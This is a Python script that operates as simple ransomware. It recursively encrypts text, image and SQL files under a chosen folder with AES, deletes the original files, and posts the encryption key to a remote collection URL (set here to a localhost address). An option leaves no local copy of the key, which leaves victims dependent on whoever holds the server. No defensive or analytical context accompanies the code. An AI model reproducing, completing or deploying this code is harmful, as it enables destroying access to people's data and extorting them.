import sys
import os
import base64
from Crypto.Cipher import AES
import requests
import json


URL = 'http://127.0.0.1:8000'

class Main:
    bufferSize = 1024*16
    def __init__(self, target, mode, keyFile):
        self.targetFolder = target
        self.mode = mode
        self.keyFile = keyFile
        self.targetFiles = ['txt', 'png', 'sql']
        self.getKey()
    def runThrough(self):
        for folders in os.walk(self.targetFolder):              #navigating through folders
            for file in folders[2]:                             #iterating through files in current folder
                if(file.split('.')[-1] in self.targetFiles):    #check is file extension is our target
                    if(self.mode=='E'):
                        self.encrypt(folders[0], file)
                    if(self.mode=='D'):
                        self.decrypt(folders[0], file)
    def encrypt(self, folder, file):
        print(f"Encrypting {os.path.join(folder, file)}")
        with open(os.path.join(folder, file), 'rb') as source, open(os.path.join(folder, "E"+file), "wb") as dest:
            block = source.read(self.bufferSize)                    #read first block
            while block:
                cipher = AES.new(self.key, AES.MODE_EAX)            #creating aes instance
                dest.write(cipher.nonce)                            #saving nonce at start of block
                ciphertext, tag = cipher.encrypt_and_digest(block)  #encryption
                dest.write(ciphertext)                              #saving encrypted result
                block = source.read(self.bufferSize)                #reading block
        os.remove(os.path.join(folder, file))                       #remove original files
    def decrypt(self, folder, file):
        print(f"Decrypting {os.path.join(folder, file)}")
        with open(os.path.join(folder, file), 'rb') as source, open(os.path.join(folder, file[1:]), "wb") as dest:
            nonce = source.read(16)                            #reading nonce from start of block
            block = source.read(self.bufferSize)               #reading first block
            while block:
                cipher = AES.new(self.key, AES.MODE_EAX, nonce)#creating aes instance
                res = cipher.decrypt(block)                    #decrypt block
                dest.write(res)                                #write result
                nonce = source.read(16)                        #read nonce
                block = source.read(self.bufferSize)           #read block
        os.remove(os.path.join(folder, file))                  #remove original files
    def getKey(self):
        #if mode encrypt, generate and save key
        if(self.mode=='E'):
            #generating key
            self.key = base64.urlsafe_b64encode(os.urandom(16))
            self.sendKey()
            if(self.keyFile!='N'):
                with open(self.keyFile, "wb") as f:
                    f.write(self.key)
        #if mode decrypt, read key
        if(self.mode=='D'):
            with open(self.keyFile, "rb") as f:
                self.key = f.read()
    def sendKey(self):
        
        try:
            myobj = {'key': self.key}
            x = requests.post(URL, data = myobj)
        except:
            pass
        
if __name__ == '__main__':
    if(len(sys.argv)!=4 or sys.argv[2] not in ['E', 'D']):
        print("Incorrect args")
        print("Run like:python3 main.py <root folder> <program mode 'E'-encrypt 'D'-decrypt> <key file path, if mode E, type 'N' to disable saving key in file>")
        print("Example:python3 main.py myData E N")
        print("Example:python3 main.py myEncryptedData D MyKeyFile.txt")
        sys.exit()
    main = Main(sys.argv[1], sys.argv[2], sys.argv[3])
    main.runThrough()
    